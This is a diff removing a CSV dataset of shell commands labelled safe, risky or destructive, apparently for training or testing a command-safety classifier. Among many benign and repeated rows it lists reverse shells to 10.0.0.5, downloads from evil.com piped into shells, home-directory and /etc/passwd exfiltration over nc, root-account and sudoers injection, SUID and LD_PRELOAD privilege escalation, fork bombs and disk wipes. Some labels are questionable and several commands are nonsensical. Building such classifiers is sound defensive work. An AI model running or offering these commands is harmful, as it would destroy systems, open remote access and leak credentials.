@@ -1,1150 +1,1150 @@
-command,label
-echo 'working' && ls,safe
-rm -rf dist,risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-wipefs -a /dev/sda,destructive
-cat -v,safe
-sudo pip,safe
-mkfs.ext4 /dev/sda,destructive
-free -h,safe
-bomb() { bomb | bomb & }; bomb,destructive
-echo 'working' && cp,safe
-chmod -R 766 /opt/app,risky
-"eval ""$PAYLOAD""",risky
-iptables -P INPUT ACCEPT,risky
-sudo pip,safe
-rm -rf /*,destructive
-cat -v,safe
-echo 'working' && mv,safe
-mount --bind /proc /mnt/proc,risky
-rm -rf dist,risky
-echo 'working' && docker,safe
-head | grep -i fail,safe
-systemctl -v,safe
-apt | grep -i fail,safe
-mv ..,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-head /tmp,safe
-dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
-echo admin:x:0:0 >> /etc/passwd,risky
-curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh,risky
-sudo ls,safe
-mkfs.ext4 /dev/sdb1,destructive
-mkfs.vfat /dev/sdb1,destructive
-shred -u /dev/mmcblk0,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-chmod -R 777 /tmp/data,risky
-pip --help,safe
-df -i,safe
-su - root,risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-sudo head,safe
-sudo grep,safe
-find /home/user -type f -name '*.log',safe
-cp config.example.yml config.yml,safe
-sudo pip,safe
-dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
-rm -rf /boot,destructive
-sudo shred,destructive
-curl http://example.com/install.sh | bash,risky
-ls .,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-shred -n 3 /dev/sda,destructive
-ls | grep -i error,safe
-mkfs.ext4 /dev/sda,destructive
-systemctl | grep -i ok,safe
-shred -vfz /dev/sda,destructive
-rm -rf build,risky
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-mkfs.xfs /dev/nvme0n1,destructive
-rm -rf /,destructive
-shred -u /dev/sdb,destructive
-nc 10.0.0.5 1234 -e /bin/bash,risky
-dd if=/dev/zero of=/dev/sda bs=4M,destructive
-shred -vfz /dev/sda,destructive
-apt ..,safe
-echo 'working' && grep,safe
-apt list --installed,safe
-echo 'working' && mv,safe
-chmod -R 766 /var/www,risky
-cal 2026,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky
-docker ..,safe
-PYTHONPATH=/tmp python script.py,risky
-grep -i 'failed' auth.log,safe
-ll,safe
-rm -rf node_modules/.cache,risky
-cp .,safe
-systemctl | grep -i fail,safe
-iptables -F,risky
-dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
-docker -v,safe
-ls -v,safe
-pip --help,safe
-echo 'working' && docker,safe
-grep -v,safe
-ping -c 4 google.com,safe
-echo 'aGVsbG8=' | base64 -d,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-shred -n 3 /dev/mmcblk0,destructive
-kill -9 $(pgrep -u root),risky
-cat -v,safe
-echo 'working' && ls,safe
-rm -rf build/,risky
-rm -rf ~,destructive
-sudo wipefs,destructive
-mkdir -v,safe
-rm -rf /boot,destructive
-nc 10.0.0.5 5555 < /etc/passwd,risky
-lsblk,safe
-sort -k2 -n data.csv,safe
-sudo mkfs,destructive
-efibootmgr --delete-bootnum --bootnum 0000,destructive
-cp -v,safe
-cat | grep -i warn,safe
-shred -vfz /dev/mmcblk0,destructive
-mkfs.xfs /dev/sdb1,destructive
-sudo rm -rf /boot/grub,destructive
-pip -v,safe
-chmod 4755 /tmp/x,risky
-node --version,safe
-pip | grep -i warn,safe
-docker run -v /:/host ubuntu bash,risky
-export LD_PRELOAD=/tmp/lib.so,risky
-chmod -R 777 /,destructive
-sudo cat,safe
-echo 'working' && apt,safe
-apt ..,safe
-dd if=/dev/urandom of=/dev/sda,destructive
-sudo groupadd developers,safe
-grep --help,safe
-sudo head,safe
-mv old_name.py new_name.py,safe
-crontab -l,safe
-echo 'working' && grep,safe
-sudo mv,safe
-rm -rf /tmp/test/*,risky
-apt | grep -i warn,safe
-rm -rf dist,risky
-sudo systemctl status sshd,safe
-chmod -R 777 /opt/app,risky
-scp -r ./backup user@server:/backups/,safe
-cp -v,safe
-rm -rf dist,risky
-chmod 4755 /tmp/x,risky
-rm -rf /,destructive
-sudo mkdir,safe
-vim -c ':!/bin/sh',risky
-systemctl | grep -i fail,safe
-head -v,safe
-nsenter -t 1 -m -u -i -n -- bash,risky
-rm -rf tmp/*,risky
-docker exec -it container /bin/sh,risky
-rm -rf /var,destructive
-shred -n 3 /dev/sda,destructive
-cat /etc/os-release,safe
-wget -qO- http://example.com/setup.sh | sh,risky
-sh -i >& /dev/udp/10.0.0.5/7777 0>&1,risky
-rm -rf ~,destructive
-pip ..,safe
-parted /dev/sda mklabel gpt,destructive
-"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",risky
-echo 'working' && systemctl,safe
-ls -v,safe
-sudo chmod 777 /usr,destructive
-chmod u+s /tmp/x,risky
-rm -rf /var,destructive
-rm -rf __pycache__,risky
-curl http://10.0.0.9/install.sh | bash,risky
-curl http://10.0.0.9/install.sh | bash,risky
-chmod -R 777 /var/www,risky
-sudo dd,destructive
-mkdir --help,safe
-git push,safe
-rm -rf /tmp/test/*,risky
-chmod 4777 /bin/bash,risky
-crontab -e,risky
-sudo ls,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-apt -v,safe
-mv --help,safe
-git stash,safe
-sudo grep,safe
-curl http://10.0.0.9/install.sh | bash,risky
-dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
-echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash,risky
-systemctl disable ufw,risky
-cat file.txt,safe
-echo 'working' && git,safe
-mv /var/log,safe
-dd if=/dev/urandom of=/dev/sdb bs=4M,destructive
-rm -f package-lock.json,risky
-git build/,safe
-mkfs.vfat /dev/sdb1,destructive
-shred -u /dev/mmcblk0,destructive
-cat data/,safe
-rg 'TODO' src/,safe
-grep ..,safe
-rm -rf tmp/*,risky
-rm -rf /tmp/test/*,risky
-mkfs.xfs /dev/sdb1,destructive
-chmod -R 777 /tmp/data,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-echo 'working' && systemctl,safe
-head --help,safe
-rm -rf /etc,destructive
-echo root2:x:0:0 >> /etc/passwd,risky
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-ls,safe
-sudo head,safe
-sudo dd if=image.iso of=/dev/sda bs=4M,destructive
-htop,safe
-cat /etc/shadow,risky
-echo 'working' && pip,safe
-chmod 777 /opt/app,risky
-git --help,safe
-mkfs.vfat /dev/sdb1,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-rm -rf ./node_modules,risky
-sh <(curl http://example.com/s.sh),risky
-ls -lah /var/log | tail -20,safe
-curl http://10.0.0.9/install.sh | bash,risky
-rm -rf build,risky
-mkdir -v,safe
-chmod 4755 /bin/bash,risky
-chmod 4755 /bin/busybox,risky
-export LD_PRELOAD=/home/user/evil.so,risky
-lsusb,safe
-cat | grep -i ok,safe
-head -20 access.log,safe
-mkdir | grep -i warn,safe
-sudo git,safe
-docker compose up -d,safe
-chmod 4755 /bin/busybox,risky
-chmod 4755 /bin/busybox,risky
-mv --help,safe
-mv -v,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && head,safe
-mkdir /var/log,safe
-apt --help,safe
-sudo rm,destructive
-find / -name 'x' -exec /bin/sh \;,risky
-npm install,safe
-echo 'working' && ls,safe
-pwd,safe
-grep -v,safe
-cp --help,safe
-ls -la,safe
-cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash,risky
-systemctl /tmp,safe
-echo 'working' && git,safe
-mv --help,safe
-chmod -R 766 /opt/app,risky
-parted /dev/sda rm 1,destructive
-rm -rf /*,destructive
-curl http://example.com/install.sh | bash,risky
-ls ~/documents,safe
-pip /tmp,safe
-find / -delete,destructive
-apt -v,safe
-curl http://example.com/install.sh | bash,risky
-top,safe
-dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
-echo 'working' && mv,safe
-echo 'working' && head,safe
-systemctl stop firewalld,risky
-curl http://example.com/install.sh | bash,risky
-nmap -p 22 localhost,safe
-:(){ :|:& };: &,destructive
-dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive
-chmod -R 766 /var/www,risky
-systemctl --help,safe
-chmod u+s /bin/busybox,risky
-echo 'working' && cat,safe
-reboot --force,risky
-which python3,safe
-rm -rf build,risky
-tail -f /var/log/syslog,safe
-mkfs.ext4 /dev/sdb1,destructive
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-curl http://10.0.0.9/install.sh | bash,risky
-head --help,safe
-rm -rf --no-preserve-root /,destructive
-systemctl --help,safe
-sudo rm -rf /var/lib/dpkg,destructive
-sudo git,safe
-rm -rf dist/*,risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-hostname,safe
-mkdir ..,safe
-systemctl status nginx,safe
-:(){ :|:& };:,destructive
-sudo git,safe
-ls --help,safe
-dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive
-chmod u+s /bin/busybox,risky
-shred -u /dev/sdb,destructive
-chmod -R 777 /var/www,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-sudo journalctl -u ssh --since 1 hour ago,safe
-rm -rf /usr,destructive
-shred -vfz /dev/mmcblk0,destructive
-curl http://example.com/install.sh | bash,risky
-wipe -fd /dev/sda,destructive
-kill -9 -1,risky
-sudo apt,safe
-cat --help,safe
-mkdir --help,safe
-sudo systemctl,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-git | grep -i error,safe
-mkdir --help,safe
-head -v,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-mkfs.ext4 /dev/sda,destructive
-chmod u+s /bin/bash,risky
-grep -v,safe
-ls --help,safe
-rm -rf /etc,destructive
-export PATH=$PATH:/opt/bin,safe
-sudo apt,safe
-chmod -R 766 .,risky
-shred -n 3 /dev/mmcblk0,destructive
-sudo pip,safe
-git pull origin main,safe
-git /tmp,safe
-echo 'working' && head,safe
-git --help,safe
-sudo ls,safe
-mv /tmp,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-rm -rf node_modules/.cache,risky
-echo 0 > /proc/sys/kernel/randomize_va_space,risky
-mkdir | grep -i error,safe
-sudo ls,safe
-grub-install --recheck --removable,destructive
-cat --help,safe
-chmod 4755 /bin/bash,risky
-docker | grep -i fail,safe
-shred -u /dev/sda,destructive
-grep -v,safe
-rm -rf node_modules/.cache,risky
-dig example.com,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-shred -vfz /dev/sdb,destructive
-rm -rf /usr,destructive
-chmod 4777 /bin/bash,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && docker,safe
-git /var/log,safe
-chmod 4755 /bin/busybox,risky
-echo 'working' && grep,safe
-chmod 4777 /tmp/x,risky
-sudo wipefs,destructive
-sudo ls,safe
-echo 'working' && cat,safe
-rm -rf /*,destructive
-yes | head -c 1000000000 > /dev/null,destructive
-systemctl src/,safe
-git data/,safe
-rm -rf tmp/*,risky
-dd if=/dev/urandom of=/dev/sda bs=512,destructive
-apt --help,safe
-sudo su -,risky
-chmod -R 766 /tmp/data,risky
-rm -rf __pycache__,risky
-sudo docker,safe
-curl http://example.com/install.sh | bash,risky
-journalctl -u nginx --since today,safe
-shutdown -h now,risky
-sudo cp,safe
-sudo cat,safe
-docker --help,safe
-cp --help,safe
-rm -rf /tmp/test/*,risky
-unzip release.zip -d /opt/app,safe
-git ~/documents,safe
-cp /var/log,safe
-id,safe
-rm -rf /*,destructive
-cmake ..,safe
-chmod -R 766 /opt/app,risky
-rm -rf node_modules/.cache,risky
-mv -v,safe
-chmod 4777 /bin/busybox,risky
-chmod -R 777 /opt/app,risky
-kill -9 1,risky
-sudo shred,destructive
-export LD_PRELOAD=/tmp/lib.so,risky
-apt update,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-chmod -R 777 .,risky
-sudo sysctl -w kernel.randomize_va_space=0,risky
-rm -rf dist,risky
-git | grep -i ok,safe
-echo 'working' && pip,safe
-chmod u+s /tmp/x,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-export LD_PRELOAD=/tmp/lib.so,risky
-chmod u+s /bin/bash,risky
-killall -9 java,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-mkfs.ext4 /dev/nvme0n1,destructive
-tar czf - /home/user | nc 10.0.0.5 4444,risky
-cargo build --release,safe
-mkdir src/,safe
-while true; do true; done,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-sudo pip,safe
-chmod 4755 /bin/busybox,risky
-dd if=/dev/zero of=/dev/nvme0n1 bs=512,destructive
-curl http://example.com/install.sh | bash,risky
-mkdir -p projects/backend/src,safe
-git --help,safe
-git | grep -i ok,safe
-shred -n 3 /dev/sdb,destructive
-systemctl -v,safe
-sudo head,safe
-rm -rf build,risky
-ls -v,safe
-echo 'working' && cat,safe
-cat | grep -i ok,safe
-rm -rf build,risky
-chmod -R 777 /tmp/data,risky
-rm -rf build,risky
-curl http://example.com/install.sh | bash,risky
-sudo dd,destructive
-chmod 755 script.sh,safe
-docker ~/documents,safe
-head /tmp,safe
-mkdir -v,safe
-rm -rf /usr,destructive
-mkdir -v,safe
-echo 'working' && git,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-rm -rf tmp/*,risky
-cp build/,safe
-cp --help,safe
-pkill -9 -u root,risky
-mv -v,safe
-dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
-mkdir .,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-chmod 4777 /bin/busybox,risky
-shred -u /dev/sda,destructive
-echo 'working' && grep,safe
-mv | grep -i error,safe
-wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py,risky
-echo 'working' && apt,safe
-apt -v,safe
-dd if=/dev/zero of=/dev/mmcblk0 bs=512,destructive
-rm -rf ~,destructive
-rm -rf node_modules/.cache,risky
-ps aux,safe
-sudo rm -rf /usr/bin,destructive
-shred -u /dev/mmcblk0,destructive
-mkfs.xfs /dev/sdb1,destructive
-echo admin:x:0:0 >> /etc/passwd,risky
-git -v,safe
-chmod -R 777 .,risky
-usermod -o -u 0 username,risky
-apt .,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-curl http://10.0.0.9/install.sh | bash,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-systemctl -v,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && head,safe
-docker --help,safe
-head | grep -i warn,safe
-ufw disable,risky
-shred -n 3 /dev/sdb,destructive
-apt /var/log,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-cat .,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-systemctl /tmp,safe
-echo 'working' && git,safe
-mkdir -v,safe
-git --help,safe
-cat .,safe
-dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
-mkfs.ext4 /dev/sdb1,destructive
-fdisk /dev/sda && mkfs.ext4 /dev/sda1,destructive
-apt /tmp,safe
-sudo apt,safe
-mv -v,safe
-export LD_PRELOAD=/tmp/lib.so,risky
-rm -rf tmp/*,risky
-sudo grep,safe
-mkfs.vfat /dev/sda,destructive
-python app.py,safe
-git -v,safe
-git add .,safe
-chmod -R 777 /var/www,risky
-uniq -c access.log | sort -rn | head,safe
-make,safe
-echo 'working' && systemctl,safe
-source ~/.bashrc,safe
-chmod 4777 /bin/bash,risky
-chmod -R 777 /tmp/data,risky
-pip /var/log,safe
-sudo systemctl,safe
-sudo wipefs,destructive
-sudo cp,safe
-pip -v,safe
-rm -rf /tmp/test/*,risky
-curl http://example.com/install.sh | bash,risky
-grep --help,safe
-sudo dd,destructive
-head -v,safe
-rm -rf /tmp/test/*,risky
-docker ps,safe
-mkfs.xfs /dev/sda,destructive
-git -v,safe
-uname -a,safe
-export LD_PRELOAD=/tmp/lib.so,risky
-sudo apt,safe
-dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
-export LD_PRELOAD=/tmp/lib.so,risky
-echo 'working' && apt,safe
-grep data/,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-sudo rm,destructive
-echo 'working' && grep,safe
-rm -rf tmp/*,risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-dmesg | tail,safe
-mv --help,safe
-git checkout -b feature/new,safe
-rm -rf __pycache__,risky
-pip --help,safe
-PATH=$PATH:/tmp,risky
-mkfs.btrfs /dev/nvme0n1,destructive
-chmod 4755 /bin/busybox,risky
-grep -v,safe
-dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive
-docker -v,safe
-ls --help,safe
-sudo git,safe
-echo 'working' && pip,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-python3 main.py --port 8080,safe
-chmod 4755 /bin/bash,risky
-touch newfile.txt,safe
-cp --help,safe
-clear,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-sudo rm,destructive
-ls | grep -i warn,safe
-head -v,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-pip -v,safe
-sudo grep,safe
-tree -L 2,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && pip,safe
-mkfs.vfat /dev/sdb1,destructive
-git -v,safe
-sudo useradd -m testuser,safe
-curl http://example.com/install.sh | bash,risky
-mkfs.vfat /dev/sdb1,destructive
-chmod -R 766 .,risky
-rm -rf /var,destructive
-"perl -e 'exec ""/bin/sh"";'",risky
-rm -rf node_modules/.cache,risky
-tar --checkpoint=1 --checkpoint-action=exec=/bin/sh,risky
-cd /var/log,safe
-npm list --depth=0,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-sudo rm -rf /,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-mkfs.vfat /dev/nvme0n1,destructive
-apt -v,safe
-ls -v,safe
-cat ..,safe
-sudo nmap -sP 192.168.1.0/24,safe
-sudo dd,destructive
-chmod u+s /bin/busybox,risky
-rm -rf dist,risky
-mv -v,safe
-chmod u+s /bin/bash,risky
-apt | grep -i fail,safe
-chmod -R 777 .,risky
-chmod 4777 /bin/bash,risky
-ls -v,safe
-chmod 4755 /bin/bash,risky
-mkdir --help,safe
-dd if=/dev/zero of=/dev/mmcblk0 bs=1M,destructive
-git status,safe
-sudo shred,destructive
-echo 'working' && mv,safe
-sudo usermod -aG sudo normaluser,risky
-rm -rf build,risky
-git log --oneline -10,safe
-echo 'working' && head,safe
-pip | grep -i fail,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-sudo mv,safe
-chmod 4777 /tmp/x,risky
-systemctl .,safe
-mv | grep -i ok,safe
-chmod -R 766 /tmp/data,risky
-sudo mkdir,safe
-mkdir | grep -i warn,safe
-apt | grep -i fail,safe
-head | grep -i warn,safe
-systemctl | grep -i fail,safe
-chmod 777 ~/.ssh/config,risky
-tar -czf backup.tar.gz /home/user/docs,safe
-sudo docker,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-chmod u+s /bin/bash,risky
-rm -rf /var,destructive
-cd ..,safe
-sudo cat,safe
-mv | grep -i ok,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
-rm -rf /bin,destructive
-chmod 777 /etc/passwd,destructive
-shred -vfz /dev/sdb,destructive
-echo root2:x:0:0 >> /etc/passwd,risky
-curl http://example.com/install.sh | bash,risky
-head --help,safe
-sudo mkfs,destructive
-echo 'working' && cp,safe
-cat ..,safe
-grep | grep -i fail,safe
-chmod -R 777 /tmp/data,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-sudo cat,safe
-git | grep -i fail,safe
-rm -rf /bin,destructive
-echo root2:x:0:0 >> /etc/passwd,risky
-chmod -R 777 /var/www,risky
-chmod -R 777 .,risky
-mv -v,safe
-echo 'working' && mv,safe
-lspci,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-grep /var/log,safe
-echo 'working' && apt,safe
-chmod u+s /bin/busybox,risky
-pip install requests,safe
-cat --help,safe
-sudo cat,safe
-sudo systemctl,safe
-dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
-docker /var/log,safe
-cat | grep -i ok,safe
-echo 'working' && cat,safe
-rm -rf build,risky
-docker logs app,safe
-echo 'working' && ls,safe
-rm -rf dist,risky
-sudo mkdir,safe
-chmod 644 config.json,safe
-cp --help,safe
-chmod +x deploy.sh,safe
-git diff,safe
-chmod -R 777 /var/www,risky
-ssh user@server 'df -h',safe
-git --help,safe
-chown root:root /tmp/x && chmod 4755 /tmp/x,risky
-rm -rf /usr,destructive
-chmod 4755 /bin/bash,risky
-curl http://example.com/install.sh | bash,risky
-head --help,safe
-grep src/,safe
-chown -R user:user /home/user/project,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-sudo docker,safe
-chmod 4755 /bin/busybox,risky
-systemctl .,safe
-ls --help,safe
-rm -rf /root,destructive
-rm -rf build,risky
-sudo shred,destructive
-socat TCP:10.0.0.5:9999 EXEC:/bin/sh,risky
-systemctl -v,safe
-mv | grep -i ok,safe
-chmod -R 766 /var/www,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-chmod -R 777 /tmp/data,risky
-head --help,safe
-echo 'working' && pip,safe
-cp -v,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-cp data/,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-curl http://example.com/install.sh | bash,risky
-shred -vfz /dev/sdb,destructive
-rm -rf /bin,destructive
-systemctl -v,safe
-echo 'working' && mkdir,safe
-sudo rm,destructive
-ls | grep -i ok,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-rm -rf build,risky
-journalctl -f,safe
-rm -rf dist,risky
-echo 'working' && docker,safe
-shred -u /dev/sdb,destructive
-cargo run,safe
-chmod 4755 /tmp/x,risky
-chmod -R 777 /var/www,risky
-cat -v,safe
-sudo mkfs,destructive
-chmod -R 777 /var/www,risky
-head --help,safe
-sudo git,safe
-mkfs.ext4 /dev/sda,destructive
-chmod -R 777 .,risky
-sudo mkfs,destructive
-cp | grep -i ok,safe
-apt --help,safe
-mv ..,safe
-grep -v,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-exit,safe
-echo 'working' && git,safe
-curl http://10.0.0.9/install.sh | bash,risky
-cp -v,safe
-grep --help,safe
-shred -u /dev/mmcblk0,destructive
-echo 'working' && grep,safe
-mkdir -v,safe
-sudo cp,safe
-grep --help,safe
-git --help,safe
-systemctl stop bluetooth,safe
-nslookup google.com,safe
-apt -v,safe
-cat --help,safe
-sed -i 's/old/new/g' file.txt,safe
-python --version,safe
-rm -rf /dev/sda,destructive
-rm -rf node_modules/.cache,risky
-grep -r error /var/log,safe
-pip build/,safe
-echo 'working' && mkdir,safe
-mkfs -t ext4 /dev/sdb,destructive
-sudo head,safe
-more notes.txt,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-man rsync,safe
-grep | grep -i ok,safe
-ip route,safe
-eval $(cat /tmp/script.txt),risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-chmod -R 777 .,risky
-watch -n 2 'df -h',safe
-chmod 777 /etc/hosts,risky
-ls /tmp,safe
-shred -n 3 /dev/sdb,destructive
-echo 'working' && apt,safe
-curl -s http://pwn.example.com/x | sh,risky
-docker /tmp,safe
-rm -rf .,destructive
-mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f,risky
-echo 'working' && mkdir,safe
-"awk 'BEGIN {system(""/bin/sh"")}'",risky
-echo 'working' && ls,safe
-tar -xzf archive.tar.gz -C /tmp,safe
-tar --checkpoint-action=exec='echo hacked',risky
-echo 'working' && cat,safe
-awk '{print $1}' access.log,safe
-blkdiscard /dev/sda,destructive
-git ~/documents,safe
-pip list,safe
-mkdir /tmp/test,safe
-dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive
-chmod 4755 /bin/busybox,risky
-shred -u /dev/mmcblk0,destructive
-bash -i >& /dev/tcp/10.0.0.5/4444 0>&1,risky
-grep | grep -i ok,safe
-git rebase main,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-systemctl list-units,safe
-export LD_PRELOAD=/tmp/lib.so,risky
-ls /tmp,safe
-sudo docker,safe
-docker system df,safe
-chmod 4777 /bin/busybox,risky
-cp | grep -i error,safe
-git -v,safe
-sudo mv,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-sudo cp,safe
-mkfs.ext4 /dev/sda,destructive
-mkdir --help,safe
-mkdir --help,safe
-rm -rf /,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-chmod 4755 /bin/busybox,risky
-df -h,safe
-cat ..,safe
-sudo systemctl,safe
-echo 'working' && git,safe
-cat -v,safe
-locate nginx.conf,safe
-mkdir | grep -i error,safe
-ls --help,safe
-sudo chmod 777 /etc/shadow,risky
-rm -rf dist,risky
-chmod -R 766 /var/www,risky
-dd if=/dev/urandom of=/dev/mmcblk0 bs=1M,destructive
-cat --help,safe
-docker -v,safe
-rm -rf /tmp/test/*,risky
-chmod -R 766 .,risky
-apt | grep -i warn,safe
-sudo mv,safe
-grep --help,safe
-sudo apt,safe
-rm -rf /tmp/cache/*,risky
-docker -v,safe
-mkfs.xfs /dev/nvme0n1,destructive
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-sleep 5 && echo done,safe
-cat -v,safe
-sudo wipefs,destructive
-ps aux | grep python,safe
-curl -I https://example.com,safe
-chmod -R 777 /var/www,risky
-echo $HOME,safe
-sudo systemctl,safe
-mv | grep -i ok,safe
-chmod 4777 /tmp/x,risky
-rm -rf node_modules/.cache,risky
-pip --help,safe
-cat | grep -i fail,safe
-sudo systemctl start postgresql,safe
-mv | grep -i fail,safe
-rm -rf /*,destructive
-chmod u+s /tmp/x,risky
-docker src/,safe
-echo 'working' && cat,safe
-chmod 4777 /bin/bash,risky
-history,safe
-docker --help,safe
-rm -rf ./*,destructive
-pip | grep -i error,safe
-netstat -tulpn,safe
-sudo mv,safe
-chmod u+s /bin/busybox,risky
-curl http://10.0.0.9/install.sh | bash,risky
-chmod u+s /bin/busybox,risky
-echo 'working' && mkdir,safe
-mkfs.btrfs /dev/nvme0n1,destructive
-curl http://example.com/install.sh | bash,risky
-chmod -R 777 .,risky
-pip | grep -i error,safe
-sudo mv,safe
-sudo shred,destructive
-du -sh * | sort -rh | head -10,safe
-docker -v,safe
-shutdown -h now &,destructive
-less README.md,safe
-sudo pip,safe
-curl http://example.com/install.sh | bash,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && ls,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-sudo docker,safe
-pip | grep -i ok,safe
-rm -rf __pycache__,risky
-pip | grep -i error,safe
-rm -rf /lib,destructive
-dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
-chmod 777 /tmp/data,risky
-gcc -o hello hello.c,safe
-docker --help,safe
-traceroute 8.8.8.8,safe
-chmod 4755 /bin/bash,risky
-systemctl src/,safe
-chmod -R 777 /opt/app,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-curl http://example.com/install.sh | bash,risky
-systemctl --help,safe
-curl http://example.com/install.sh | bash,risky
-rm -rf /proc,destructive
-sudo setenforce 0,risky
-mkfs.vfat /dev/sda,destructive
-dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
-cp -v,safe
-rm -rf /boot,destructive
-sudo cp,safe
-docker -v,safe
-chmod -R 766 /var/www,risky
-time python script.py,safe
-rm -rf /bin,destructive
-rm -rf /etc,destructive
-ls --help,safe
-chmod -R 777 .,risky
-docker src/,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-git fetch origin,safe
-yes | head -10,safe
-rm -rf tmp/*,risky
-sudo cp,safe
-echo 'working' && mv,safe
-du -sh /home/user,safe
-mv --help,safe
-curl http://example.com/install.sh | bash,risky
-sudo mkfs,destructive
-env,safe
-cp | grep -i error,safe
-ls | grep -i fail,safe
-find . -name '*.py',safe
-ls | grep -i warn,safe
-sudo rm,destructive
-echo root2:x:0:0 >> /etc/passwd,risky
-docker | grep -i fail,safe
-shred -n 3 /dev/mmcblk0,destructive
-dd if=/dev/zero of=/dev/nvme0n1 bs=1M,destructive
-rm -rf build,risky
-chmod -R 766 .,risky
-docker | grep -i warn,safe
-chmod 4755 /bin/bash,risky
-echo 'working' && systemctl,safe
-sudo su,risky
-dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
-rm -fr /,destructive
-sudo cat,safe
-curl http://example.com/install.sh | bash,risky
-echo 'working' && docker,safe
-find / -exec rm -rf {} +,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-chmod -R 777 /tmp/data,risky
-head .,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-rm -rf /,destructive
-curl http://example.com/install.sh | bash,risky
-head -v,safe
-chmod -R 766 /var/www,risky
-echo 'working' && pip,safe
-dd if=/dev/zero of=/dev/sda bs=4M,destructive
-sudo apt install htop,safe
-chmod -R 777 .,risky
-chmod -R 766 .,risky
-git | grep -i fail,safe
-echo admin:x:0:0 >> /etc/passwd,risky
